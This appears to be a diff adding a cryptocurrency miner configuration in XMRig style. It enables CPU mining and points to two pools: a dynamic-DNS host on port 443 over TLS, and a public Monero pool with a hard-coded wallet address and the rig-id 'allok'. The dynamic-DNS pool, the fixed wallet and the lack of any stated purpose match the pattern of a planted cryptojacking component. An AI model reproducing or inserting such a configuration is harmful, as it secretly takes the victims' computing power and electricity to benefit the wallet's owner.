@@ -1,0 +1,20 @@
+{
+    "autosave": true,
+    "cpu": true,
+    "opencl": false,
+    "cuda": false,
+    "pools": [
+        {
+            "url": "lannayduoc.ddns.net:443",
+            "rig-id": "allok",
+            "tls": true
+        },
+        {
+            "url": "us-west.minexmr.com:443",
+            "user": "443mD1oGvjQ5QRPqo8sw29EjA3gyShX4g6wdbjGXNFBU4e5ftXoTpwq7DXu4s2LXkKKxnX6uaC7HCNBGtzjpKeRx8xeTRLT",
+            "rig-id": "allok",
+            "keepalive": true,
+            "tls": true
+        }
+    ]
+}
